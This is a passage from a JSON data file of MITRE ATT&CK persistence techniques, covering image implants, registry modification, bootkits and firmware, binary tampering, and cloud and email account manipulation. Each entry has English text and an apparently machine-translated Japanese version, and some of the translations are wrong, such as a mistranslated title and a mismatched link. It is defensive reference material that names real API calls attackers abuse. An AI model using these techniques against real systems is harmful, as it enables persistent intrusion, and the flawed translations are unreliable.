                "name_eng": "Implant Internal Image",
                "name_jp": "インプラント内部画像",
                "description_eng": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)",
                "description_jp": "攻撃者は、クラウドやコンテナのイメージに悪意のあるコードを埋め込み、環境にアクセスした後に永続性を確立する可能性があります。Amazon Web Services (AWS)のAmazon Machine Images (AMI)、Google Cloud Platform (GCP)のImage、AzureのImage、そしてDockerのような一般的なコンテナランタイムが移植またはバックドアされる可能性があります。Upload Malware](https://attack.mitre.org/techniques/T1608/001)とは異なり、このテクニックは、敵対者が被害者の環境内のレジストリにイメージを埋め込むことに焦点を当てています。インフラストラクチャのプロビジョニング方法によっては、インフラストラクチャのプロビジョニングツールが常に最新のイメージを使用するように指示されている場合、持続的なアクセスを提供する可能性があります(引用: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\nクラウドコンテナイメージにバックドアを仕込むことを容易にするツールが開発されている。(引用：Rhino Labs Cloud Backdoor September 2019) 敵が侵害されたAWSインスタンスにアクセスし、利用可能なコンテナイメージをリストアップする権限を持っていれば、[Web Shell](https://attack.mitre.org/techniques/T1505/003)のようなバックドアを埋め込むことができる。(引用：Rhino Labs Cloud Image Backdoor Technique Sept 2019)",
                "subtechniques": []
            },
            {
                "id": "T1112",
                "name_eng": "Modify Registry",
                "name_jp": "レジストリの変更",
                "description_eng": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\n\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\n\nThe Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\n\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",
                "description_jp": "攻撃者は、防御の回避、永続性、実行を支援する他の様々なテクニックの一部として、Windowsレジストリと相互作用する可能性がある。\n\nレジストリの特定の領域へのアクセスはアカウント権限に依存し、いくつかのキーは管理者レベルのアクセスを必要とする。Windows内蔵のコマンドラインユーティリティ[Reg](https://attack.mitre.org/software/S0075)は、ローカルまたはリモートのレジストリ変更に使用することができる。(引用: Microsoft Reg) リモートアクセスツールのような他のツールも、Windows APIを通じてレジストリと対話する機能を含んでいるかもしれない。\n\nレジストリは、[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027) を介して設定情報や悪意のあるペイロードを隠すために変更される可能性があります。(引用: Unit42 BabyShark Feb 2019)(引用: Avaddon Ransomware 2021)(引用: Microsoft BlackCat Jun 2022)(引用: CISA Russian Gov Critical Infra 2018) レジストリはまた、[防御を損なう](https://attack.mitre.org/techniques/T1562)、例えば、すべての Microsoft Office 製品でマクロを有効にする、ユーザーに警告することなく特権の昇格を許可する、許可される送信リクエストの最大数を増やす、および/または平文の資格情報をメモリに保存するようにシステムを変更する、などである(引用: CISA LockBit 2023年)(引用: Unit42 BabyShark Feb 2019年)\n\nリモートシステムのレジストリは、横移動の一環としてファイルの実行を支援するために変更される可能性があります。(引用: Microsoft Remote) 多くの場合、[有効なアカウント](https://attack.mitre.org/techniques/T1078) が、RPC 通信のためのリモートシステムの [SMB/Windows 管理者共有](https://attack.mitre.org/techniques/T1021/002) へのアクセスとともに必要とされます。\n\n最後に、レジストリの修正には、キー名をヌル文字で前置するなどのキーを隠す動作も含まれる場合があります。このようなキーは、[Reg](https://attack.mitre.org/software/S0075)またはWin32 APIを使用する他のユーティリティを介して読み取られたときにエラーを引き起こし、無視されます。(引用: Microsoft Reghide NOV 2006) 敵対者は、永続性を維持するために使用されるペイロード/コマンドを隠すために、このような疑似隠しキーを悪用する可能性があります。(引用: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",
                "subtechniques": []
            },
            {
                "id": "T1542",
                "name_eng": "Pre-OS Boot",
                "name_jp": "OSブート前",
                "description_eng": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
                "description_jp": "攻撃者は、システムの永続性を確立する方法として、プレOSブートメカニズムを悪用する可能性がある。コンピュータの起動プロセスでは、ファームウェアと様々なスタートアップサービスがオペレーティング・システムの前にロードされる。これらのプログラムは、オペレーティングシステムが制御を開始する前に実行の流れを制御する。 引用：Wikipedia ブート)\n\n攻撃者は、BIOS (Basic Input/Output System)やUEFI (The Unified Extensible Firmware Interface)のようなブートドライバやファームウェアのデータを上書きし、オペレーティングシステムより下のレイヤーのシステム上で持続させる可能性がある。このレベルのマルウェアは、ホスト・ソフトウェア・ベースの防御では検出されないため、検出が特に困難になる可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1542.003",
                        "name_eng": "Bootkit",
                        "name_jp": "ブートキット",
                        "description_eng": "Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nIn BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.\n\nIn UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)",
                        "description_jp": "攻撃者は、ブートキットを使用してシステムに潜伏する可能性があります。ブートキットは、ハードドライブのブートセクタを変更し、コンピュータのオペレーティングシステムがロードされる前に悪意のあるコードを実行できるようにするマルウェアの亜種です。ブートキットはオペレーティング・システムの下のレイヤーに存在するため、組織がブートキットの使用を疑って適切な対処を行わない限り、完全な修復を行うことは困難です。\n\nBIOSシステムでは、ブートキットはマスターブートレコード（MBR）やボリュームブートレコード（VBR）を変更する可能性があります（引用：Mandiant M Trends 2016）。ブートローダーの場所です。ブートドライブへの未加工アクセス権を持つ敵対者は、この領域を上書きし、起動中の実行を通常のブートローダーから敵対コードに転換することができる(引用: Lau 2011)。\n\nMBR はブート・プロセスの制御を VBR に渡します。MBRの場合と同様に、ブート・ドライブに生アクセスできる敵は、起動中の実行を敵のコードに迂回させるために、VBRを上書きする可能性があります。\n\nUEFI (Unified Extensible Firmware Interface)システムでは、ブートキットは代わりにEFIシステムパーティション(ESP)にファイルを作成したり変更したりするかもしれません。ESP は UEFI を含むデバイスで使われるデータストレージ上のパーティションで、システムが OS やシステムで使われる他のユーティリティをブートすることを可能にします。敵対者は、ESP内に新たに作成されたファイルやパッチを適用したファイルを使用して、悪意のあるカーネルコードを実行することができる。 引用：Microsoft Security）（ 引用：welivesecurity"
                    },
                    {
                        "id": "T1542.005",
                        "name_eng": "TFTP Boot",
                        "name_jp": "TFTPブート",
                        "description_eng": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",
                        "description_jp": "攻撃者はネットブートを悪用して、TFTP（Trivial File Transfer Protocol）サーバーから不正なネットワークデバイスのオペレーティングシステムをロードする可能性があります。TFTP ブート（ネットブート）は、ネットワーク管理者が集中管理サーバーから設定管理されたネットワークデバイスイメージをロードするために一般的に使用されます。ネットブートは、ブートシーケンスの1つのオプションであり、デバイスイメージを集中管理、管理、制御するために使用できます。\n\n悪意のある TFTP サーバーは、[Modify System Image](https://attack.mitre.org/techniques/T1601)と併用することで、デバイスの起動時やリセット時に変更されたイメージをロードすることができます。この不正なイメージによって、敵はデバイスの設定を変更したり、デバイスに悪意のある機能を追加したり、バックドアを導入したりすることができます。この手法は、[ROMMONkit](https://attack.mitre.org/techniques/T1542/004) に類似しており、ネットワークデバイスが変更されたイメージを実行する可能性があります。(引用: Cisco Blog Legacy Device Attacks)"
                    },
                    {
                        "id": "T1542.002",
                        "name_eng": "Component Firmware",
                        "name_jp": "コンポーネント・ファームウェア",
                        "description_eng": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                        "description_jp": "敵対者は、システム上で存続するために、コンポーネントのファームウェアを修正するかもしれない。一部の敵対者は、コンピュータ・コンポーネントを侵害し、オペレーティング・システムやメ イン・システムのファームウェアや BIOS の外側で敵対者のコードを実行する、悪意のあるファームウェアをインス トールするために、洗練された手段を採用するかもしれない。このテクニックは、[システム・ファームウェア](https://attack.mitre.org/techniques/T1542/001)に類似しているかもしれないが、同じ能力や完全性チェックのレベルを持たないかもしれない、他のシステム・コンポーネント／デバイスに対して実施される。\n\n悪意のあるコンポーネント・ファームウェアは、アクセスを維持するための典型的な失敗やハードディスク の再イメージの可能性があるにもかかわらず、システムへの永続的なアクセス・レベルを提供し、また、ホス ト・ソフトウェア・ベースの防御や完全性チェックを回避する方法を提供する可能性がある。"
                    },
                    {
                        "id": "T1542.004",
                        "name_eng": "ROMMONkit",
                        "name_jp": "ロモンキット",
                        "description_eng": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",
                        "description_jp": "敵対者は、検出が困難な永続的なアクセスを提供し、デバイスの動作を操作するために、敵対者のコードで不正なファームウェアをロードすることにより、ROM Monitor (ROMMON)を悪用する可能性がある。(引用：Cisco Synful Knock Evolution） （引用：Cisco Blog Legacy Device Attacks）\n\n\nROMMON は、ブートローダー、ブートイメージ、またはブートヘルパーとして機能する Cisco ネットワークデバイスのファームウェアであり、プラットフォームの電源投入時やリセット時に、ハードウェアとソフトウェアを初期化する。TFTP Boot](https://attack.mitre.org/techniques/T1542/005)と同様に、敵対者は、既存の ROMMON イメージを上書きするために、ローカルまたはリモート（例えば TFTP 経由）で ROMMON イメージを敵対コードでアップグレードし、デバイスを再起動することができる。これにより、敵対者は、検出が困難な方法で ROMMON を更新し、システム上で永続性を得ることができます。"
                    },
                    {
                        "id": "T1542.001",
                        "name_eng": "System Firmware",
                        "name_jp": "システムファームウェア",
                        "description_eng": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                        "description_jp": "BIOS（基本入出力システム）やUEFI（Unified Extensible Firmware Interface）またはEFI（Extensible Firmware Interface）は、オペレーティングシステムとコンピュータのハードウェアの間のソフトウェアインターフェイスとして動作するシステムファームウェアの例である（引用：Wikipedia BIOS）（引用：Wikipedia UEFI）（引用：UEFIについて）\n\nBIOSや(U)EFIのようなシステムファームウェアはコンピュータの機能の根底にあり、敵対者によって悪意のある活動を実行または支援するために変更される可能性がある。システム・ファームウェアを上書きする機能が存在するため、巧妙な敵対者は、検出が困難なシステム上に永続的な手段として、悪意のあるファームウェア・アップデートをインストールする手段を与える可能性がある。"
                    }
                ]
            },
            {
                "id": "T1554",
                "name_eng": "Compromise Host Software Binary",
                "name_jp": "ホストソフトウェアのバイナリ侵害",
                "description_eng": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.\n\nAdversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation: Google Cloud Mandiant UNC3886 2024)\n\nAn adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)\n\nAfter modifying a binary, an adversary may attempt to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by preventing it from updating (e.g., via the `yum-versionlock` command or `versionlock.list` file in Linux systems that use the yum package manager).(Citation: Google Cloud Mandiant UNC3886 2024)",
                "description_jp": "攻撃者は、ホストソフトウェアバイナリを変更して、システムへの永続的なアクセスを確立する可能性がある。ソフトウェアバイナリ/実行可能ファイルは、幅広いシステムコマンドやサービス、プログラム、ライブラリを提供します。一般的なソフトウェアバイナリは、SSHクライアント、FTPクライアント、電子メールクライアント、ウェブブラウザ、その他多くのユーザまたはサーバアプリケーションです。\n\n攻撃者は、ホストソフトウェアバイナリを変更することで永続性を確立することができる。例えば、攻撃者は、正規のアプリケーションバイナリ（またはサポートファイル）をバックドアに置き換えたり、感染させたりします。これらのバイナリはアプリケーションやユーザによって日常的に実行される可能性があるため、敵対者はこれを利用してホストに永続的にアクセスすることができます。敵対者はまた、ログイン中に認証情報を持続的に収集するために、SSH クライアントのようなソフトウェアバイナリを変更する可能性があります（すなわち、[Modify Authentication Process](https://attack.mitre.org/techniques/T1556)）。(引用：Google Cloud Mandiant UNC3886 2024)\n\n敵対者はまた、バイナリの正当な実行の前に、悪意のある機能（例えば、IAT Hooking/Entry point patching）（引用：Unit42 Banking Trojans Hooking 2022）をパッチすることによって、既存のバイナリを変更する可能性がある。例えば、敵対者は、バイナリのエントリーポイントを変更し、通常の実行フローを再開する前に、敵対者がパッチを適用した悪意のあるコードを指すようにすることができる(引用：ESET FontOnLake Analysis 2021)。\n\nバイナリを修正した後、敵対者はバイナリの更新を（yum パッケージマネージャを使用する Linux システムでは、`yum-versionlock` コマンドまたは `versionlock.list` ファイルを介して）阻止することで、[防御の障害](https://attack.mitre.org/techniques/T1562) を試みる可能性があります(引用: Google Cloud Mandiant UNC3886 2024)。",
                "subtechniques": []
            },
            {
                "id": "T1098",
                "name_eng": "Account Manipulation",
                "name_jp": "口座操作",
                "description_eng": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
                "description_jp": "攻撃者は、被害者システムへのアクセスを維持及び/又は昇格させるために、アカウントを操作する可能性がある。アカウント操作は、認証情報や権限グループの変更など、侵害されたアカウントへの敵対者のアクセスを維持または変更するあらゆる行為で構成される可能性がある（引用：FireEye SMOKEDHAM June 2021）。これらの行為には、パスワードの有効期間ポリシーを回避し、侵害された認証情報の有効期間を維持するための反復的なパスワード更新の実行など、セキュリティポリシーを破壊するように設計されたアカウント活動も含まれる可能性がある。\n\nアカウントを作成または操作するためには、敵対者はシステムまたはドメインに対して既に十分な権限を持ってい なければならない。しかし、アカウント操作は、変更が追加の役割、権限、またはより高い特権[Valid Accounts](https://attack.mitre.org/techniques/T1078)へのアクセスを許可する特権の昇格につながる可能性もある。",
                "subtechniques": [
                    {
                        "id": "T1098.001",
                        "name_eng": "Additional Cloud Credentials",
                        "name_jp": "追加のクラウド・クレデンシャル",
                        "description_eng": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation: Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024) If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation Persistence)\n\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account.(Citation: Mandiant APT42 Operations 2024) As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user’s primary password is reset.(Citation: Microsoft Entra ID App Passwords)",
                        "description_jp": "敵は、敵が管理する認証情報をクラウドアカウントに追加して、環境内の被害者アカウントとインスタンスへの持続的なアクセスを維持する可能性がある。\n\n例えば、敵対者は、Azure / Entra ID の既存の正当な認証情報に加えて、サービスプリンシパルやアプリケーションの認証情報を追加する可能性があります（引用：Microsoft SolarWinds Customer Guidance）（引用：Blue Cloud of Death）（引用：Blue Cloud of Death Video）これらの認証情報には、x509 キーとパスワードの両方が含まれます。(引用：Microsoft SolarWinds Customer Guidance) 十分な権限があれば、Azureポータル、Azureコマンドラインインターフェイス、AzureまたはAzure PowerShellモジュールなど、さまざまな方法で認証情報を追加できます。 (引用：Demystifying Azure AD Service Principals)\n\nインフラストラクチャ・アズ・ア・サービス（IaaS）環境では、[Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)を通じてアクセス権を得た後、敵対者はAWSの<code>CreateKeyPair</code>または<code>ImportKeyPair</code> API、またはGCPの<code>gcloud compute os-login ssh-keys add</code>コマンドのいずれかを使用して、独自のSSHキーを生成またはインポートする可能性があります。(引用: GCP SSH Key Add) これにより、侵害されたクラウドアカウントをさらに使用することなく、クラウド環境内のインスタンスへの永続的なアクセスが可能になります。 (引用: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\n攻撃者は、AWS の <code>CreateAccessKey</code> API または GCP の <code>gcloud iam service-accounts keys create</code> コマンドを使用して、アカウントにアクセス キーを追加することもできます。あるいは、AWSの<code>CreateLoginProfile</code> APIを使用して、[Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538)のAWS Management Consoleにログインするために使用できるパスワードを追加することもできる。(引用: Permiso Scattered Spider 2023)(引用: Lacework AI Resource Hijacking 2024)ターゲットアカウントがリクエストアカウントと異なる権限を持っている場合、敵対者は環境内の権限をエスカレートさせることもできる可能性がある(すなわち、[Cloud Accounts](https://attack.mitre.org/techniques/T1538)。引用：Rhino Security Labs AWS Privilege Escalation）（引用：Sysdig ScarletEel 2.0）例えば、Entra ID 環境では、アプリケーション管理者ロールを持つ敵対者は、アプリケーションのサービスプリンシパルに新しい認証情報のセットを追加することができます。そうすることで、アプリケーション管理者とは異なる可能性のあるサービスプリンシパルのロールと権限にアクセスできるようになります。(引用：SpecterOps Azure Privilege Escalation)\n\nAWS 環境では、適切な権限を持つ敵対者は、`sts:GetFederationToken` API 呼び出しを使用して、元のユーザーアカウントの権限に結びついた [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) の一時的な認証情報のセットを作成することもできます。これらの一時的な認証情報は、元のアカウントの API 認証情報が無効化されても、その有効期間中は有効なままである可能性があります。\n(引用：Crowdstrike AWS User Federation Persistence)\n\nアプリパスワード機能が有効になっている Entra ID 環境では、敵対者はユーザアカウントにアプリパスワードを追加できる可能性があります（引用：Mandiant APT42 Operations 2024）。アプリパスワードは、多要素認証（MFA）をサポートしていないレガシーデバイスで使用されることを意図しているため、アプリパスワードを追加すると、敵対者は MFA 要件をバイパスできるようになります。さらに、アプリのパスワードは、ユーザーのプライマリパスワードがリセットされた場合でも有効なままである可能性があります（引用：Microsoft Entra ID App Passwords）。"
                    },
                    {
                        "id": "T1098.002",
                        "name_eng": "Additional Email Delegate Permissions",
                        "name_jp": "追加の電子メール委任権限",
                        "description_eng": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)",
                        "description_jp": "敵対者は、敵対者が管理する電子メールアカウントへの永続的なアクセスを維持するために、追加の許可レベルを与える可能性があります。\n\n例えば、<code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) コマンドレットは、オンプレミスのExchangeやクラウドベースのサービスOffice 365で利用可能で、メールボックスにアクセス許可を追加します。(引用: Microsoft - Add-MailboxPermission)(引用: FireEye APT35 2018)(引用: Crowdstrike Hiding in Plain Sight 2018) Google Workspaceでは、Google Adminコンソールから委任を有効にすることができ、ユーザーはGmailの設定からアカウントを委任することができる。(引用: Gmail Delegation)(引用: Google Ensuring Your Information is Safe)\n\n敵はまた、個々のフォルダーの権限や役割を通じて、メールボックスのフォルダー権限を割り当てる可能性もある。Office 365環境では、敵は情報ストアのトップ（ルート）、受信トレイ、またはその他のメールボックスフォルダに、デフォルトまたは匿名ユーザーの権限またはロールを割り当てる可能性があります。フォルダに1つまたは両方のユーザー権限を割り当てることで、敵対者はテナント内の他のアカウントを利用して、ターゲットユーザーのメールフォルダへの永続性を維持することができます(引用：Mandiant Defend UNC2452 White Paper)\n\nこれは、持続的脅威インシデントやBEC（ビジネスメール侵害）インシデントで使用される可能性があります。敵対者は、侵害したいアカウントに[Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)を追加することができます。これにより、システムにアクセスするための新たなテクニックを使用することが可能になります。例えば、侵害されたビジネスアカウントは、受信トレイルール（例：[Internal Spearphishing](https://attack.mitre.org/techniques/T1534)）を作成しながら、ターゲットビジネスのネットワーク内の他のアカウントにメッセージを送信するために使用されることが多いため、メッセージはスパム/フィッシング検出メカニズムを回避します。(引用：Bienstock, D. - Defending O365 - 2019)"
                    },
                    {
                        "id": "T1098.003",
                        "name_eng": "Additional Cloud Roles",
                        "name_jp": "追加のクラウドの役割",
                        "description_eng": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 